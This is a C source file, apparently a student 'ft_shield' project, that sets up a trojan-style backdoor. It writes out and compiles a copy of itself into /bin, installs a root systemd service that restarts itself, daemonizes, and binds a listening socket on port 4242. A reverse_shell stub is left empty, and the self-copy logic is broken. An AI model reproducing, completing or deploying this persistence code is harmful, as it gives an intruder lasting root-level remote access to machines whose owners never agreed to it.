char arr[10];
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
#include "string.h"
#include <fcntl.h>
#include "stdlib.h"
#include <linux/limits.h>
#include <time.h>
#include <time.h>
#include <sys/time.h>
#include <poll.h>


#define  PORT 4242
#define LOGIN "hlahwaou"


char target_dir[10000] = "/bin";
char target_path[] = "/bin/ft_shield";
char daemon_config_path[] = "/etc/systemd/system/";
char service_path[] = "/etc/systemd/system/ft_shield.service";
char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nWorkingDirectory=/bin\nExecStart=/bin/ft_shield\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";


char cmd[1000];
char filePath[600];

typedef struct server {

} t_server;

bool in_bin(){
	char cwd[PATH_MAX];
	int len;
   
	if (getcwd(cwd, sizeof(cwd)) == NULL) 
		exit(1);
	if (realpath(target_dir,target_dir) == NULL)
		exit(1);
	printf("%s = %s\n", cwd, target_dir);
	return strcmp(cwd, target_dir) == 0;
}






void generate_file_path(){
	int pid = getpid(); 
	int index = 5;
    struct timeval tp;
	long ms;
    srand(time(NULL));
    unsigned int random_number = (unsigned int)rand(); 


	memcpy(filePath, "/tmp/",6 );
	gettimeofday(&tp, NULL);
	ms = tp.tv_sec * 1000 + tp.tv_usec / 1000;


	while (pid > 0){
	    filePath[index] = (pid % 10) + '0';
	    pid = pid / 10;
	    index++;
	}
	while (ms > 0){
	    filePath[index] = (ms % 10) + '0';
	    ms = ms / 10;
	    index++;
	}
    while (random_number > 0){
	    filePath[index] = (random_number % 10) + '0';
	    random_number  = random_number / 10;
	    index++;
	}
	filePath[index++] = '.';
	filePath[index++] = 'c';
	filePath[index] = '\0';
}

void quine(){
	generate_file_path();
	FILE* fptr = fopen(filePath, "w+");


	if (!fptr){
		perror("errro");
		printf("sorry\n");
		exit(0);
	}


	fprintf(fptr, "char arr[] = {");
	for (int i =0 ; i < sizeof(arr); i++){
		if (fprintf(fptr, "  %0#4x,", arr[i]) < 0)
			exit(0);
	}
	if (fprintf(fptr, "};\n") < 0 )
		exit(0);
	for (int i =0 ; i < sizeof(arr); i++){
		if (fprintf(fptr, "%c", arr[i]) < 0)
			exit(0);
	}
	fclose(fptr);
}


void compileTheCode(){
    	sprintf(cmd, "cc %s -o %s", filePath, target_path);
	if (system(cmd) != 0 )
		exit(1); 
}


void setUpService(){
	FILE* fptr = fopen("/etc/systemd/system/ft_shield.service", "w+");

	if (!fptr){
		perror("errro");
		printf("sorry\n");
		exit(0);
	}
	if (fprintf(fptr, "%s", daemon_config) < 0){
		perror("errro");
		printf("we wern't able to write our .service\n");
		exit(0);
	}
	fclose(fptr);
	int status = system("systemctl daemon-reload && systemctl enable ft_shield.service && systemctl start ft_shield.service");
	if (status == -1 || (WIFEXITED(status)  && WEXITSTATUS(status) != 0 )){
		printf("Error cmd '%s' exited %d\n", cmd, WEXITSTATUS(status));
		exit(1); 
	}
}





void configure_daemon(){
    
	// let the program create themself
	quine();
	// compile the code 
	compileTheCode();
	// clean file .c
	unlink(filePath);


	// now that we have binnary let's set the service 
	setUpService();
	printf("------------\n");
	printf("we have access to write our service");
	printf("Daemon configuration\n%s", daemon_config);



    
}



void display_login(){
	printf("%s\n", LOGIN);
}


void start_daemon(){
	int pid = fork();


	if (pid != 0)
		exit(0);

	//unmask the file mode
	umask(0);
	//set new session
	if( setsid() < 0)
		exit(1);
	// Change the current working directory to root.
	chdir("/");
	// Close stdin. stdout and stderr
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);	

    	for (int i = 0; i < 10000; i++){
        	sleep(4);
    	}
}

int create_socket(struct sockaddr_in *address) {
    int s_fd;
    int opt = 1;

    if ((s_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    address->sin_family = AF_INET;
    address->sin_addr.s_addr = INADDR_ANY;
    address->sin_port = htons(PORT);

    if (setsockopt(s_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)))
        exit(EXIT_FAILURE);
    

    if (bind(s_fd, (struct sockaddr *)address, sizeof(*address)) < 0) 
        exit(EXIT_FAILURE);
    

    if (listen(s_fd, 3) < 0) 
        exit(EXIT_FAILURE);

    return s_fd;
}

void reverse_shell(){



}


int main(){

    // if we are in /bin 
    if (getuid() != 0){
        printf("you don't have root access\n");
    }
    display_login();
    



    if (in_bin()) {
        printf("we are at bin\n");
	start_daemon();
	reverse_shell();
    } else {
        printf("ooops we are not at bin\n");
	   // start_daemon();
	   configure_daemon();

    }





    return 0;
}
